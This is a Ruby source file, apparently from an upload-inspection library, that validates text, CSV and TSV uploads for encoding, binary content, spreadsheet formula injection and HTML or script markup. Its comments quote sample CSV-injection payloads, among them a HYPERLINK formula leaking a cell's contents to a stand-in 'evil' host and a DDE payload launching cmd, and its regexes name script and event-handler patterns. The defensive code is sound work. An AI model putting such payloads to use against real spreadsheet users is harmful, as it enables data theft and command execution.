# frozen_string_literal: true

module UploadInspector
  # Plain text, CSV and TSV. Text has no magic bytes, so the type comes from the name alone;
  # this check proves the content really is text:
  #
  # - valid UTF-8 (a UTF-8 BOM is allowed; UTF-16 and legacy code pages are rejected)
  # - no NUL or control characters other than tab, CR and LF, so a binary cannot pass as .csv
  # - CSV/TSV only, unless allow_csv_formulas: no cell that a spreadsheet would run as a
  #   formula calling a function or another program (CSV injection), e.g.
  #   =HYPERLINK("http://evil/?"&A1), +cmd|' /C calc'!A0, @SUM(1)
  # - unless allow_text_markup: no HTML, SVG or server-side script tags. A browser or proxy
  #   that sniffs content (missing nosniff, old IE) renders such a .txt as a page (stored XSS).
  class TextInspector
    include Rejectable

    TYPES = %w[text/plain text/csv text/tab-separated-values].freeze
    SPREADSHEET_TYPES = %w[text/csv text/tab-separated-values].freeze
    UTF8_BOM = "\xEF\xBB\xBF".b
    UTF16_BOM = /\A(?:\xFF\xFE|\xFE\xFF)/n
    CONTROL = /[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]/
    # A cell may start after any delimiter Excel splits on (comma, semicolon in European
    # locales, tab) or a line break, optionally quoted and padded. Every delimiter counts as a
    # possible cell start, also inside quoted text: over-approximating can only reject more. A
    # quoted value runs to its closing quote (across lines), an unquoted one to the next delimiter.
    FORMULA_CELL = /(?:\A|[,;\t\r\n])[ \t]*(?:"\s*([=+\-@](?:[^"]|"")*)|([=+\-@][^,;\t\r\n]*))/
    # Running anything needs a function call (a name right before "(") or DDE
    # (program|topic!item); arithmetic, negative numbers, phone numbers like +1 (555) 010 and
    # @handles stay accepted.
    FORMULA_ACTION = /\p{L}[\p{L}\d_.]*\(|\|/
    # Anywhere: opening tags that run or load something, any tag with an event handler
    # ("<details open ontoggle=...>", '<x/onclick=...>'), and server-side tags. Data like "a<b",
    # "x < html" or "<b>bold</b>" passes.
    MARKUP = %r{
      <(?:script|html|head|body|iframe|frame|svg|object|embed|meta|base|link|style|img)[\s/>]
      | <[a-z][^<>]*[\s/"']on[a-z]+\s*=
      | <\?php | <% | <!doctype\s+html
    }xi
    # At the start (after whitespace), the WHATWG MIME sniffing signatures that make a browser
    # treat the whole file as HTML or XML.
    SNIFFED_AS_HTML = /\A\s*(?:<(?:!doctype\s+html|html|head|script|iframe|h1|div|font|table|a|style|title|b|body|br|p)[\s>]|<!--|<\?xml)/i

    def initialize(policy)
      @policy = policy
    end

    def verify!(path, type)
      reject!(:text_too_large, "exceeds #{@policy.max_inflate_size} bytes") if File.size(path) > @policy.max_inflate_size

      text = File.binread(path)
      reject!(:text_unsupported_encoding, 'UTF-16') if text.match?(UTF16_BOM)
      text = text.delete_prefix(UTF8_BOM).force_encoding(Encoding::UTF_8)
      reject!(:text_unsupported_encoding, 'not valid UTF-8') unless text.valid_encoding?
      reject!(:text_binary_content, 'control characters') if text.match?(CONTROL)
      check_markup!(text) unless @policy.allow_text_markup
      check_formulas!(text) if SPREADSHEET_TYPES.include?(type) && !@policy.allow_csv_formulas
    end

  private

    def check_markup!(text)
      found = text[SNIFFED_AS_HTML] || text[MARKUP]
      reject!(:text_markup, found.strip[0, 40]) if found
    end

    def check_formulas!(text)
      text.scan(FORMULA_CELL) do |quoted, bare|
        cell = quoted || bare
        reject!(:csv_formula, cell[0, 40]) if cell.match?(FORMULA_ACTION)
      end
    end
  end
end
